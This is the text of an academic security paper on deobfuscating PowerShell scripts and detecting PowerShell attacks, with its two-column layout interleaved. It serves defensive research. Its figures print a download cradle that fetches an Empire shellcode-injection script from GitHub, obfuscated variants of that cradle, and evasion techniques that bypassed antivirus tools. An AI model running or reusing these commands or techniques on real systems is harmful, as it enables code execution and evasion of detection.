@@ -1,0 +1,1183 @@
+  Effective and Light-Weight Deobfuscation and Semantic-Aware
+              Attack Detection for PowerShell Scripts
+                     Zhenyuan Li                                                 Qi Alfred Chen                                  Chunlin Xiong
+                 Zhejiang University                                   University of California, Irvine                       Zhejiang University
+               lizhenyuan@zju.edu.cn                                         alfchen@uci.edu                               chunlinxiong94@zju.edu.cn
+
+                        Yan Chen                                                   Tiantian Zhu                                      Hai Yang
+             Northwestern University                                Zhejiang University of Technology                            MagicShield Inc
+             ychen@northwestern.edu                                        ttzhu@zjut.edu.cn                               hai.yang@magic-shield.com
+
+ABSTRACT                                                                                      KEYWORDS
+In recent years, PowerShell is increasingly reported to appear in a                           PowerShell; deobfuscation; abstract syntax tree; semantic-aware
+variety of cyber attacks ranging from advanced persistent threat,                             ACM Reference Format:
+ransomware, phishing emails, cryptojacking, financial threats, to                             Zhenyuan Li, Qi Alfred Chen, Chunlin Xiong, Yan Chen, Tiantian Zhu,
+fileless attacks. However, since the PowerShell language is dynamic                           and Hai Yang. 2019. Effective and Light-Weight Deobfuscation and Semantic-
+by design and can construct script pieces at different levels, state-of-                      Aware Attack Detection for PowerShell Scripts. In 2019 ACM SIGSAC Con-
+the-art static analysis based PowerShell attack detection approaches                          ference on Computer and Communications Security (CCS ’19), November
+are inherently vulnerable to obfuscations. To overcome this chal-                             11–15, 2019, London, United Kingdom. ACM, New York, NY, USA, 17 pages.
+lenge, in this paper we design the first effective and light-weight                           https://doi.org/10.1145/3319535.3363187
+deobfuscation approach for PowerShell scripts. To address the chal-
+lenge in precisely identifying the recoverable script pieces, we                              1    INTRODUCTION
+design a novel subtree-based deobfuscation method that performs                               PowerShell is a powerful administration scripting tool with an
+obfuscation detection and emulation-based recovery at the level of                            object-oriented dynamically-typed scripting language [36]. With
+subtrees in the abstract syntax tree of PowerShell scripts.                                   Microsoft’s open source strategy, it gains increasingly popularity
+    Building upon the new deobfuscation method, we are able to                                among programmers in recent years [4]. Unfortunately, attackers
+further design the first semantic-aware PowerShell attack detec-                              have also recognized the advantages of PowerShell as an attack
+tion system. To enable semantic-based detection, we leverage the                              vector, given that it is pre-installed on most Windows computers,
+classic objective-oriented association mining algorithm and newly                             has direct access to priviledged system functions, and also can be
+identify 31 semantic signatures for PowerShell attacks. We perform                            executed directly from memory and thus completely fileless. In
+an evaluation on a collection of 2342 benign samples and 4141                                 as early as 2016, Symantec published a white paper titled “The
+malicious samples, and find that our deobfuscation method takes                               Increased Use of PowerShell in Attacks” [65]. In the following
+less than 0.5 seconds on average and meanwhile increases the simi-                            two years, PowerShell as a keyword appeared 64 times in five
+larity between the obfuscated and original scripts from only 0.5%                             subsequent Symantec white papers [59] with topics ranging from
+to around 80%, which is thus both effective and light-weight. In                              ransomware, phishing emails, cryptojacking, financial threats, to
+addition, with our deobfuscation applied, the attack detection rates                          fileless attacks.
+for Windows Defender and VirusTotal increase substantially from                                   To combat such threats, state-of-the-art PowerShell attack de-
+0.3% and 2.65% to 75.0% and 90.0%, respectively. Furthermore, when                            tection approaches mainly use static analysis to match string-level
+our deobfuscation is applied, our semantic-aware attack detection                             signatures, e.g., by hand picking [55] or leveraging machine learn-
+system outperforms both Windows Defender and VirusTotal with                                  ing algorithms [26, 32, 53]. Compared to dynamic analysis based
+a 92.3% true positive rate and a 0% false positive rate on average.                           approaches, static analysis based approaches are indeed more ef-
+                                                                                              ficient and have higher code coverage, but since the PowerShell
+CCS CONCEPTS                                                                                  language is dynamic by design and can construct script pieces at
+• Security and privacy → Malware and its mitigation; Systems                                  different levels, these existing approaches are inherently vulnerable
+security.                                                                                     to obfuscations. For example, as shown later in §2, we experiment
+                                                                                              a few classic script obfuscation techniques, such as randomization,
+                                                                                              string-level manipulation, and encoding on malicious PowerShell
+Permission to make digital or hard copies of all or part of this work for personal or
+classroom use is granted without fee provided that copies are not made or distributed         scripts, and find that state-of-the-art anti-virus engines in VirusTo-
+for profit or commercial advantage and that copies bear this notice and the full citation     tal [11] can be generally bypassed. To overcome this challenge, it is
+on the first page. Copyrights for components of this work owned by others than ACM            highly desired to have a effective and light-weight deobfuscation
+must be honored. Abstracting with credit is permitted. To copy otherwise, or republish,
+to post on servers or to redistribute to lists, requires prior specific permission and/or a   solution for PowerShell scripts, which can generally benefit almost
+fee. Request permissions from permissions@acm.org.                                            all defense solutions against PowerShell attacks, ranging from their
+CCS ’19, November 11–15, 2019, London, United Kingdom                                         detection, analysis, to forensics.
+© 2019 Association for Computing Machinery.
+ACM ISBN 978-1-4503-6747-9/19/11. . . $15.00                                                      However, to the best of our knowledge, how to achieve effective
+https://doi.org/10.1145/3319535.3363187                                                       and light-weight deobfuscation for script languages still remains
+Table 1: Comparison of representative existing deobfusca-                  the first semantic-aware PowerShell attack detection system. In
+tion approaches for script languages and our approach.                     the system design, we adopt the classic Objective-Oriented Asso-
+                                                                           ciation (OOA) mining algorithm, which can automatically extract
+                   Targeted     Obfuscation     Recovery     Light
+                   language     det. accuracy    quality    -weight
+                                                                           frequently appeared commands and functions sets, called OOA
+                                                                           rules, for semantic signature matching. We apply this algorithm
+  PSDEM [41]       PowerShell         ✗             ✓          ✓           to a collection of malicious PowerShell script datasets, and newly
+   JSDES [13]      JavaScript         ✗             ✓          ✗
+                                                                           identifies 31 OOA rules for PowerShell attacks.
+  Lu et al. [42]   JavaScript        N/A            ✓          ✗
+                                                                              To evaluate the performance of our PowerShell deobfuscation
+  Our approach     PowerShell         ✓             ✓          ✓
+                                                                           approach and attack detection system, we perform experiments on
+                                                                           2342 benign script samples collected from top 500 repositories in
+an unsolved research problem. Table 1 shows a comparison of rep-           GitHub, and 4141 malicious samples collected from security blogs
+resentative existing script deobfuscation approaches in obfuscation        [55], attack analysis white papers [55], and open source attack
+detection accuracy, recovery quality, and overhead. In the PSDEM           repositories [1, 9, 43]. Our results show that the deobfuscated scripts
+approach [41], Liu et al. manually examined different PowerShell           using our subtree-based approach have an average similarity of
+obfuscation techniques and then designed targeted deobfuscation            around 80% to the original scripts. In comparison, the average
+solutions for each technique individually. This approach cannot            similarity before applying our deobfuscation is only 0.5%, which
+cover unknown obfuscation techniques and also suffer from high             thus shows a high script recovery effectiveness. Meanwhile, our
+false-positive rate in obfuscation detection (as shown later in §6.2.1).   deobfuscation approach is shown to take less than 0.5 seconds on
+The JSDES approach [13] performs deobfuscation specifically for            average to deobfuscate scripts with an average size of 5.4 Kilobytes,
+function-based obfuscation in JavaScript, which thus cannot detect         which thus also shows high efficiency.
+obfuscation done purely by basic operations instead of functions              Our results further show that our deobfuscation approach can
+[66]. Lu et al. [42] proposed to deobfuscate JaveScript code by dy-        significantly improve the effectiveness of PowerShell attack detec-
+namic analysis and program slicing. Since it relies on dynamic             tion. More specifically, with our deobfuscation approach applied,
+analysis, it does not need to detect obfuscation, but its recovery         the average true positive detection rates increase substantially from
+has limited code coverage, and also is much less light weight than         0.3% to 75.0% for Windows Defender, and from 2.65% to 90.0% for
+static analysis based approaches such as PSDEM.                            VirusTotal. For both Windows Defender and VirusTotal, there are
+   To fill this critical research gap, in this paper we design the first   0% false-positive rates after applying our deobfuscation. Further-
+effective and light-weight deobfuscation approach for PowerShell           more, our results show that when our deobfuscation approach is
+scripts. Note that although this paper targets PowerShell, the de-         applied, our semantic-aware attack detection system outperforms
+obfuscation methodology itself is general and thus adaptable to            both Windows Defender and VirusTotal with a 92.3% true positive
+other script languages such as JavaScript. To achieve our design           rate and a 0% false-positive rate on average.
+goal, our key insight is that a generic property for obfuscations of          This paper makes the following contributions:
+script languages is that in the run-time execution the obfuscated            • Leveraging the insight that obfuscations fundamentally limit the
+script pieces must be recovered to the original, non-obfuscated                effectiveness of PowerShell attack detection today, we design
+script pieces first before being executed. Thus, for an obfuscated             the first effective and light-weight deobfuscation approach
+script, as long as all the pairs of the obfuscated script pieces and           for PowerShell scripts. To address the challenge in precisely
+their corresponding recovery logic can be located, we can emulate              identifying the recoverable script pieces, we design a novel
+the recovery process for each pair and thus gradually reconstruct              subtree-based deobfuscation method that performs obfuscation
+the entire original script. However, the key challenge is how to               detection and emulation-based recovery at the level of subtrees
+precisely identify these pairs, which we call recoverable script pieces        in the PowerShell script AST, which is the minimum unit of
+in this work. If such identification is not precise enough, direct exe-        obfuscation.
+cution of the script pieces cannot trigger the the recovery process          • Building upon the new deobfuscation method, we are able to
+and thus can only get intermediate script recovery results or script           design the first semantic-aware PowerShell attack detection
+execution results.                                                             system. To enable semantic-based detection, we employ the
+   To address this challenge, we propose a novel subtree-based de-             classic Objective-oriented Association (OOA) mining algorithm
+obfuscation method that performs obfuscation detection at the level            to obtain PowerShell attack signatures, and newly identifie
+of subtrees in the PowerShell script Abstract Syntax Tree (AST),               31 OOA rules for PowerShell attacks based on a collection of
+which is the minimum unit of obfuscation for PowerShell. Since                 malicious PowerShell script databases.
+a typical script of several Kilobytes can already have thousands             • Based on a collection of 6483 PowerShell script samples (2342
+of subtrees, to achieve high deobfuscation efficiency we design a              benign ones and 4141 malicious ones), we find that our de-
+machine learning based classifier to first classify whether a given            obfuscation method is not only effective, which increases the
+subtree is obfuscated. For the obfuscated ones, we then traverse               similarity between the obfuscated and original scripts from only
+them in a bottom-up order in the AST to identify the recoverable               0.5% to around 80%, but also efficient, which takes less than 0.5
+script pieces and emulate the recovery logic, which thus eventually            seconds on average for scripts with an average size of 5.4 Kilo-
+constructs the entire deobfuscated scripts.                                    bytes. By applying our deobfuscation, the attack detection rates
+   Since our deobfuscation approach can expose the semantics of                for Windows Defender and VirusTotal increase substantially
+PowerShell scripts, we are able to build upon it to further design             from 0.3% and 2.65% to 75.0% and 90.0%. Furthermore, when our
+    (New-Object Net.WebClient).DownloadString
+    ("hxxps://raw.githubusercontent.com/PowerShellEmpire/
+    Empire/master/data/module_source/code_execution/Invok
+    e-Shellcode.ps1")
+                     (a) Original script
+
+
+    # Step 1: Calculate the string using decoding
+    $SecstringEncoding =
+    [Runtime.InteropServiceS.Marshal]::Protostringauto([R
+    untime.InteropServiceS.Marshal]::SecureStringtObstr($
+    ('76492d1116743f0423413b16050...=='| Converto-
+    Securestring -K (96..65)))
+    # Step 2: "Reconstruct" at the script block level
+    and execution
+    Invoke-Expression $SecstringEncoding
+
+      (b) Encoding-based obfuscation at script block level
+                                                                        Figure 2: Average alerts count on VirusTotal for original and
+    # Step 1: Calculate the string using multiple methods               obfuscated samples
+    $StrReorder = "{1}{0}{2}"-f'w-o','Ne','ject'
+    $Strjoint = "Net.W" + "ebClient"
+    $Random = "downlOAdstRIng"                                                           Table 2: Obfuscation schemes
+    $Url = "{9}...{26}"-f'ellE'...'s1'
+    # Step 2: "Reconstruct" at the token level and                            Scheme #          Adopted obfuscation techniques (§2)
+    execution
+                                                                                 S1        O1, O2 (Token-level)
+    (&$StrReorder $Strjoint).$Random.Invoke($Url)
+                                                                                 S2        O1, O2 (Script block-level)
+       (c) Multiple obfuscation methods at token level                           S3        O1, O3 (Script block-level, Secstring encoding)
+Figure 1: Examples of obfuscated scripts at different levels                     S4        O1, O3 (Script block-level, Hex encoding)
+
+
+                                                                        memory without any form of isolation, and thus can avoid ma-
+    deobfuscation is applied, our semantic-aware attack detection       licious files on the disk and bypass traditional file-based defense
+    system outperforms both Windows Defender and VirusTotal             methods. The first two points support live-off-the-land attacks, and
+    with a 92.3% true positive rate and a 0% false-positive rate on     the third point makes complete fileless attacks feasible. To make
+    average.                                                            matters worse, it is not complicated to conduct such attacks at all.
+2     BACKGROUND AND MOTIVATION                                         For example, open source PowerShell attack frameworks, such as
+                                                                        Empire [1] and Nishang [54], provide wide distribution of these
+Due to unique features of PowerShell, it is commonly used as an         attacks.
+attack vector. For example, according to the attack knowledge data-
+base organized by MITRE [3], PowerShell is used to implement            2.2    Obfuscation Techniques for PowerShell
+various functions at different stages of real-world attacks. Among
+all the samples, PowerShell is most commonly used for download-         Obfuscation is the most popular way to evade detection. For bi-
+ing and payload execution. At the same time, PowerShell is applied      nary programs, logic structure obfuscation is widely adopted. Some
+to establish reverse shells and gather information on the target ma-    analysts attempted to migrate these methods to PowerShell and im-
+chines. In this section, we will discuss the challenges in PowerShell   plemented AST-based obfuscation [15]. However, the effectiveness
+attacks from two perspectives.                                          of this type of method is extraordinarily limited. For PowerShell,
+                                                                        in order to hide malicious intentions and thus avoid detection, at-
+                                                                        tackers often take advantage of the dynamic nature of PowerShell
+2.1     “Living Off the Land” and Fileless Attacks                      to create highly obfuscated scripts. Specifically, PowerShell has
+        via PowerShell                                                  no clear boundary between code and data. As shown in Figure 1,
+“Living off the land” attacks refer to attacks that drop as fewer       the scripts can be constructed at runtime. Logically, the process of
+files as possible and only use clean system tools to avoid detection.   executing obfuscated scripts can be divided into two steps: (1) Cal-
+Fileless attacks refer to attacks that avoid leaving any trace on the   culating strings that can play multiple roles in scripts. Theoretically,
+disk. According to Symantec’s white paper [64], these two attacks       as long as the process of calculating a string is reversible, a corre-
+have been the trend of cyber attacks in recent years.                   sponding obfuscation method can be found. So there are numerous
+    PowerShell is an ideal tool for such attacks for several reasons.   methods to do obfuscations. (2) Reconstructing original scripts and
+First, PowerShell is pre-installed on all Windows computers since       executing them. For reconstruction at the token level, these two
+Windows 7 and Windows Server 2008 R2. Thus, at present, ma-             steps are mixed up, which makes the deobfuscation more challeng-
+licious PowerShell scripts can compromise almost all Windows.           ing. We analyze the commonly used obfuscation techniques in the
+Second, as a powerful first-party admin tool, PowerShell provides       Symantec’s white paper [21] and discuss them in the following
+easy access to all major Windows components including Windows           three categories below:
+Management Instrumentation (WMI) and Component Object Model             O1. Randomization. Randomized obfuscation is a technology that
+(COM), which can directly trigger many privileged system-level          attackers can make random changes to scripts without affecting
+operations. Third, PowerShell scripts can be executed directly from     their executions and semantics. These techniques include white
+space randomization, case randomization, variable and function             to VirusTotal [11], a website that aggregates as many as 70 state-
+name randomization, and insertion characters ignored by Power-             of-art antivirus products and performs online scanning. From the
+Shell. These techniques take the advantage that PowerShell inter-          scanning results, we count the number of the antivirus engines that
+preter is not sensitive to certain script properties, such as case-        report malware alerts.
+insensitive. The variable "$Random" in Figure 1 (c) is an example              Results. The experiment results are shown in Figure 2. As
+for this kind of obfuscation. Other methods, such as using aliases         shown, all four obfuscation schemes can effectively bypass nearly
+rather than full-type commands, can be classified into this category.      all state-of-the-art antivirus products. More specifically, as long as
+This kind of obfuscation only affects reading, but does not affect         one of them is applied, the average number of alerts for malicious
+semantics and syntax.                                                      scripts drops significantly from 13.2 to at most 3.1, which is at least
+O2. String manipulation. In order to obfuscate strings in Power-           4.25 times lower. Scheme S2 is especially effective, which reduces
+Shell, there are a variety of methods such as string splitting, string     the average alert number by as high as 1320 times to only 0.01.
+reversing and string reordering, which refer to the calculation of         Compared to S2, the alert number for scheme S3 is slightly higher,
+variables "$StrReorder", "$Strjoint" and "$Url" in Figure 1                which is because the obfuscation in S2 is at the token level, and thus
+(c).                                                                       more fine-grained than that in S3 in hiding malicious behaviors.
+O3. Encoding. Encoding-based obfuscation is the most common                The alert numbers for S3 and S4 are higher than those for S1 and S2,
+obfuscation technique in the real world. After encoding, the obfus-        but are still only around 2 to 3, which means that malicious scripts
+cated scripts reflect a small amount of information of the original        with obfuscation scheme S3 and S4 are still able to evade majority
+scripts. Variables "$SecstringEncoding" in Figure 1 (b) shows              of the antivirus engines today. Note that the alert numbers for S3
+how encoding is used in obfuscation. There are several built-in            and S4 are higher because there are three antivirus engines that
+encoding functions and also attackers can write their encoding             always raise alerts when encoding-based obfuscation is detected. As
+modules easily.                                                            shown, even for benign samples with scheme S3 and S4, these three
+    In practice, attackers frequently combine these methods to in-         engines also reported alerts. Since obfuscations have benign usage
+crease the effect of obfuscation. For example, the famous PowerShell       such as for intellectual property protection and avoid unwanted
+attack framework Empire [1] has a obfuscated variant Obfuscat-             changes [60], this heuristics can lead to false positives, which is
+edEmpire [16] that mixes the above three kinds of obfuscation. In          probably why majority of the antivirus engines do not use such
+recent white papers [30, 33, 45] on attack analysis, it is also reported   heuristics as shown in Figure 2.
+that many attacks tend to use at least one of obfuscation methods.
+
+
+                                                                           3   OVERVIEW
+2.3    Effectiveness of Obfuscation on PowerShell                          As shown in §2.3, obfuscation is highly effective in bypassing to-
+       Attack Detection Today                                              day’s the PowerShell attack detection. To combat such threat, it is
+In this section, we experimentally explore the effectiveness of rep-       thus highly desired to design a effective and light-weight deobfus-
+resentative PowerShell script obfuscation schemes against state-of-        cation mechanism for PowerShell scripts. In this paper, we are the
+the-art PowerShell attack detection systems.                               first to design such a mechanism and use it as the key building block
+   Experiment methodology. In this experiment, we choose five              to develop the first semantic-aware PowerShell attack detection
+representative obfuscation schemes with combinations of obfusca-           system. As shown in Figure 3, the detection process can be divided
+tion techniques at different construction levels and with different        into three phases:
+encoding methods, which are summarized in Table 2. As a basic                  Deobfuscation phase. In the deobfuscation phase, we propose
+obfuscation technique, randomization is applied to all five schemes.       a novel subtree-based approach leveraging the features of the Pow-
+For scheme S1 and S2, string manipulations are then adopted at             erShell scripts. We treat the AST subtrees as the minimum units
+the token level and the script block level, respectively. For scheme       of obfuscation, and perform recovery on the subtrees, and finally
+S3 and S4, we apply encoding based obfuscation (described in §2),          construct the deobfuscated scripts. The deobfuscated scripts are
+which is utilized at the script block level. We pick two types of          then used in both training and detection phases. Note that such
+encoding techniques for them, namely, secure string-based encod-           deobfuscation function can benefit not only the detection of Power-
+ing, and hex-based encoding, both of which are commonly used               Shell attacks in this paper but the analysis and forensics of them as
+[65], and represent the encoding with the secret key and the encod-        well, which is thus a general contribution to the PowerShell attack
+ing without the secret key, respectively. For scheme S5, we apply          defense area.
+AST-based obfuscation (described in §2). All obfuscation techniques            Training and detection phases. After the deobfuscation phase,
+used in these schemes are available in open source project Invoke-         the semantics of the malicious PowerShell scripts are exposed and
+Obfuscation [17], which is widely used in APT attacks like Emotet          thus enable us to design and implement the first semantic-aware
+[45], POWERTON [30] and APT19 [33].                                        PowerShell attack detection approach. As shown on the right side of
+   For PowerShell script samples, we collect 75 malicious samples          Figure 3, we adopt the classic Objective-oriented Association (OOA)
+from open source attack framework and security blogs, and the              mining algorithm [68] on malicious PowerShell script databases,
+same number of benign samples from Github [7]. Each of these               which is able to automatically extract 31 OOA rules for signature
+150 scripts is then obfuscated using the 5 schemes above. Subse-           matching. Besides, we can adapt existing anti-virus engines and
+quently, we upload both the original scripts and obfuscated scripts        manual analysis as extensions.
+                                   Malicious                 OOA rule
+                                                                                          Obfuscated PowerShell scripts have to bring out the hidden
+                                     Scripts
+          Obfuscated                Database
+                                                             Generate                  original scripts so that interpreter can execute them correctly. In
+            Scripts                                                                    Figure 1, we show the separation of the obfuscated script pieces
+                                    Command              OOA rules                     from other parts of the script. As shown, these script pieces have
+                                                          Database
+                                     Query                                             two parts: hidden original script pieces, and recovery algorithms.
+                                   Database
+       Deobfuscation
+                                                                   Training            More importantly, these pieces return string-typed recovered pieces.
+                                                signatures           phase             Therefore, we call these script pieces recoverable pieces, and the
+                                                                                       corresponding subtrees in AST recoverable subtrees. As long as these
+                                                             Existing Anti-
+         Deobfuscated               Signature
+                                                              Virus Engines
+                                                                                       recoverable pieces are found, we can directly use the embedded
+            Scripts                  Matching
+                          Parser                    unmatched                          recovery algorithms to recover the original scripts. However, in
+                                     matched
+                                                                                       practice, there is no clear boundary between the recoverable pieces
+                                                                Manually
+                                    Detection                   Analysis               and other parts of the script, especially when the script is obfuscated
+        Deobfuscation                Reports
+            phase                                       Detection & Analysis
+                                                                                       in multiple layers. To address this problem, we propose an AST
+                                                                phase                  subtree-based approach that locates recoverable pieces first and
+Figure 3: Framework of our deobfuscation approach and                                  then reconstructs the original scripts.
+semantic-aware PowerShell attack detection.
+
+   Application scenarios. Our deobfuscation-based semantic-aware                       4.1    Subtree-based Deobfuscation Approach
+attack detection approach is mostly based on static analysis1 . Thus,                         Overview.
+compared to dynamic analysis based attack detection approaches,                        The overall process of our subtree-based deobfuscation is shown
+our approach has higher code coverage, much lower overhead, and                        in Figure 4. At a high level, the process of deobfuscation can be
+also does not require modification to the system or interpreter.                       divided into five stages. First, PowerShell script samples are parsed
+Compared to existing static analysis based attack detection ap-                        to ASTs, and subtrees are extracted. In addition, variables may be
+proaches [26, 32, 53, 55], our approach is more resilient to obfusca-                  used to store some key information during the obfuscation process.
+tion and also more explainable as our detection is semantics based.                    So when we build AST, we will add links to the elements at the
+With these advantages over alternative approaches, our approach                        two ends of an assignment statement. Such connections should
+can be deployed in various application scenarios, including but not                    be considered in both step 2 and 3. Second, we find obfuscated
+limited to:                                                                            subtrees/pieces with a classifier. It is noteworthy that not all trees
+     • Real-time attack detection. Since our approach is highly                        met obfuscation characteristics are recoverable subtrees. Third,
+       efficient, it is especially suitable for real-time attack detection             obfuscated pieces are recovered with an emulator to obtain original
+       tasks. In addition, our approach is easy to deploy and can also                 script pieces. Fourth, the deobfuscated pieces should be parsed into
+       provide detection reports with semantic-level information                       new ASTs and replace the obfuscated subtrees. Such process loops
+       and explanations.                                                               until there is no obfuscated subtree left. Finally, script pieces are
+     • Large-scale automated malware analysis. Existing automated                      reconstructed to get the deobfuscated scripts. Then we use a post-
+       malware analysis platforms, such as Hybrid-Analysis [2],                        processing module to remove some redundant structures added
+       mostly use static analysis to only extract strings from Power-                  during the obfuscation process in the scripts.
+       Shell scripts [8], which has very limited semantics informa-                        In stage 2, distinguishing obfuscated pieces and recoverable ones
+       tion and is also vulnerable to obfuscations. Using our system,                  is a necessary but challenging problem. More specifically, there
+       the analysis can be not only resilient to obfuscations but                      are two situations where obfuscated pieces and recoverable pieces
+       also more detailed with semantics information, which makes                      are inconsistent. First, the recoverable pieces can be a part of ob-
+       malware behavior explanations and classifications possible.                     fuscated pieces. As shown in Figure 5, leaf nodes are recoverable
+                                                                                       pieces while non-leaf nodes are obfuscated pieces. In this case, if
+4    POWERSHELL DEOBFUSCATION                                                          we directly try to recover the obfuscated pieces, the original script
+In this section, we describe the design details of the deobfusca-                      pieces will be executed as an intermediate process, which thus pre-
+tion phase. Unlike previous works that either highly depend on                         vents us from getting the original scripts. Second, obfuscated pieces
+manual analysis [41] or have strong assumptions [17, 48], Our ap-                      can be a part of the recoverable pieces. In this case, similar to the
+proaches is not only more effective but also more light-weight. Our                    first case, directly recovering from obfuscated pieces can only get
+deobfuscation process is designed to be mainly static instead of                       intermediate results but not the original scripts.
+dynamic for two main reasons. First, dynamic approaches require                            Thus, only if we recover with recoverable pieces can we get
+extra modification to the system or the interpreter to collect data                    the desired original script pieces. In our approach, we address this
+and have higher overhead. Second, dynamic approaches have a                            problem by traversing all suspicious nodes in a bottom-up order
+known limitation of low program coverage. Although our approach                        with a stack, which thus allows us to avoid recovering at a level that
+is designed for PowerShell, the design itself is general and thus can                  is too high. To avoid recovering at a level that is too low, we leverage
+be extended to other similar script languages, such as JavaScript.                     the output of the emulator. If the output is not a string, which means
+1 The only part of our approach that requires dynamic intervention is the emulation-
+                                                                                       the subtree is not recoverable. Then we wait for processing at higher
+based recovery, which is only triggered when necessary to increase deobfuscation       levels. We can always find recoverable subtrees for obfuscated
+efficiency as detailed later in §4                                                     script pieces. Otherwise, the emulator will return new script pieces,
+                                                                                                                                                                 No obfuscated
+                                                                                                           Train with manually
+                                                                                                                                                                  subtree left
+                                                                                                               marked data
+
+                                                      (1) Extract subtrees                    Subtrees                       (2) Subtree-based
+        #                                                                                       Stack
+                                                                                                                                                                    (5) Post Processing
+        #Collected PowerShell Scripts                                                                     Pop subtrees for Obfuscation Detection
+        #                                                                                                   vectorization
+        ([RuNTImE.iNTErOPSERVIces.mArs                                                  AST              and classification
+                                                               ScriptBlock                                                      Is Obfuscated
+        hal]::ptRtOStriNguNI([RuNtIme.
+        INTeropSerVICeS.MaRshaL]::sEcu
+                                                                                                                                                                   #
+        reStRiNgTogLoBAlAllOCunICoDe($                         NamedBlock                                                   (3) Emulation-based                    #Deobfuscated Scripts
+        ('76492d1116743f0423413b16050a
+        5345MgB8AHkAbgBTAFUASgBlAHUATw
+                                                                                                                                  Recovery                         #
+                                                                                                                                                                   function Out-EncryptedScript
+        BwAGEAZwBjAFYAeQBzACsAYgBEAEwA                          Pipeline
+                                                                                                                                                                   { ... $Key = New-Object
+        TgBBAGcAPQA9AHwANgAxADYAOQBlAG
+                                                                                                                                                                   System.Security.Cryptography.
+        UANwBjAGIAYgAyADcAZABkADcAYwA5
+                                                    CommandExpression          Command                                                                             TripleDESCryptoServiceProvide
+        AGIAYwA1ADUAYQA3AGYANQAzADAANw                                                                       Push       #
+                                                                                                                                                                   r $Key.Mode =
+        BhADAAMgAyAGYANwAwAGEAZQA0ADcA                                                                     subtrees     #Generated Scripts Pieces
+                                                                                                                       Generated PowerShell Scripts                [System.Security.Cryptography
+        YwBhADgAZgBjADAANQBhADIAOAAxAD AST      UnaryExpression
+                                                                                                                        #
+                                                                        ParenExpression                                                                            .CipherMode]::CBC [Byte[]]
+        MAZQA2ADQAYwBlAGEAMQBlADEAZABjParser                                                                            function Copy-PROpErtY{
+                                                                                                                                                                   $KeyBytes =
+        AGIANwBlAGUAZQBmADAAYgAxAGQAYQ                                                                                  param(...)}}
+                                                                                                                                                                   $DerivedPass.GetBytes(16)
+        A1ADIAYwA4ADYAYQBlADcAMQA3ADMA          ParenExpression              Pipeline
+                                                                                                                                                                   $Encryptor =
+        OQA3AGIAZgBkADAAMAAxADgAYQBmAD
+                                                                                                                                                                   $Key.CreateEncryptor($KeyByte
+        gAOQA0ADcANAA0ADkAMQBmADcAMAAw                                                                                                    AST
+                                                    Pipeline         CommandExpression                                                                             s,$ivBytes)$MemStream= New-
+        AGIAZQA3ADgAMQA5ADAAZQAyADgAYQ                                                                                                  Parser                     ObjectSystem.IO.MemoryStream
+        BhAGIAMABmADcANABkADIAYQBiADIA
+                                                                                                                                                                   $CryptoStream = New-Object
+        MQA2ADIAYwA0ADMANwBiAGQAMQAyAD
+        cAZAAzADQANQAzAGMAMQA3ADgANwA4
+                                                     ...             MemberExpression          ...                          FunctionDefinition
+                                                                                                                                                                   System.Security.Cryptography.
+                                                                                                                                                                   CryptoStream($MemStream,
+        AGEAZQA1ADYAOAAzAGQjAGYAM ...                                                                                  ParamBlock         NamedBlock               $Encryptor,
+        1AA=='| cONvErttO-SecUrESTRING                                       ...                                                                                   [System.Security.Cryptography
+        -KeY (4..19)))) )|&(
+        ([strInG]$VErbosePrEfEREnCe)                                                                              ... Pipeline         Pipeline       Pipeline     .CryptoStreamMode]::Write)
+                                                                                                                                                                   ...
+        [1,3]+'X'-JOIn'')
+                                                             (4) AST Update
+                                                                                                                            ...         ...           ...
+
+                        Figure 4: An overview of the proposed subtree-based deobfuscation for PowerShell scripts.
+
+
+              (&("{1}{0}{2}"-f'w-o','Ne','ject') ("Net.W" +                                                sections, we will discuss these five stages in detail. Corresponding
+              "ebClient")).("{2}{1}{0}"-
+              f'tring','nloadS','DoW').Invoke(("{20}{13}                                                   code can be found on [5].
+              {26} ... ','.','mo','code','/Inv','rce'))
+
+
+
+     (&("{1}{0}{2}"-f'w-o','Ne','ject')                            "{20}{13}{26} ...
+                                                                                                           4.2        Extract Suspicious Subtrees
+     ("Net.W" + "ebClient")).("{2}{1}               Invoke         ','.','mo','code','
+     {0}"-f'tring','nloadS','DoW')                                 /Inv','rce'                             To parse the PowerShell scripts and get the AST, we adopt Mi-
+                                                                                                           crosoft’s official library System.Management.Automation.Language.
+     &("{1}{0}{2}"-f'w-               "{2}{1}{0}"-
+     o','Ne','ject')                  f'tring','nload
+                                                                                                           PowerShell’s AST has 71 types of nodes in total, such as Pipeline-
+     ("Net.W" + "ebClient")           S','DoW'                                                             Ast, CommandAst, CommandExpressionAst, etc. The parser returns
+                                                                                                           an AST with a ScriptBlockAst type of root. A typical script with
+     "{1}{0}{2}"-f'w-
+     o','Ne','ject'
+                                "Net.W" +
+                                "ebClient"
+                                                                                                           sizes of several Kilobytes can have thousands of nodes in AST, which
+                                                                                                           means thousands of subtrees and thus makes it time-consuming to
+  Figure 5: Pass recovered script pieces directly (cropped)                                                check all subtrees.
+                                                                                                              Fortunately, there are only two ways to pass recovered pieces
+               $StrReorder = "{1}{0}{2}"-f'w-o','Ne','ject'                                                to the upper nodes, either directly through pipes or indirectly
+               $Strjoint = "Net.W" + "ebClient"
+               $RanReserve = "{2}{1}{0}"-f'tring','nloadS','DoW'
+                                                                                                           through variables. Therefore, we only need to check two types
+               $Url = "{20}{13}{26}...','.','mo','code','/Inv','rce'
+               (&$StrReorder $Strjoint).$Random.Invoke($Url)
+                                                                                                           of subtrees, subtrees roots of PipelineAst type, or second sub-
+                                                                                                           trees under nodes of AssignmentStatementAst. We call these two
+     (&$StrReorder                                   $Url = "{20}{13}{26} ...                              types of subtrees suspicious subtrees. As shown in Figure 5 and
+     $Strjoint).$Random.Invoke($Url)                 ','.','mo','code','/Inv','rce'
+                                                                                                           Figure 6, red blocks refer to PipelineAst nodes and blue blocks
+                                                                                                           refer to AssignmentStatementAst nodes. Leveraging this insight,
+     (&($StrReorder)                                     $RanReserve = "{2}{1}{0}"-
+     $Strjoint).($Random)
+                                 Invoke      $Url
+                                                         f'tring','nloadS','DoW'                           the number of subtrees we need to check is significantly reduced.
+                                                                                                           Based on this idea, we traverse the AST in a breadth-first manner
+     &($StrReorder)         $Random                              $Strjoint = "Net.W" +                     and push suspicious subtrees into a stack for subsequent steps.
+     $Strjoint                                                   "ebClient"
+
+
+                                                                                                           4.3        Subtree-based Obfuscation Detection
+                                                          $StrReorder = "{1}{0}{2}"-
+     $StrReorder        $Strjoint
+                                                          f'w-o','Ne','ject'                               For the identified subtrees, we employ a binary classifier to find
+                                                                                                           obfuscated subtrees. Even though Obfuscation can hide semantics
